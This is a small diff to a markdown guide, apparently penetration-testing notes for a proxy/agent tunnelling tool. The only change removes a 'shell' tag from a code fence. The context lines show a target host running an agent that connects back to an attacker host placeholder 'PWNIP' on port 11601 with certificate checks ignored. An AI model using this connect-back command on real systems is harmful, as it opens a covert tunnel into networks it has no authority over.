@@ -23,7 +23,7 @@ sudo ./proxy -selfcert
 ```
 
 ## 5. Connect from Target Host to Server
-```shell
+```
 chmod +x ./agent ; ./agent -connect PWNIP:11601 --ignore-cert
 ```
 
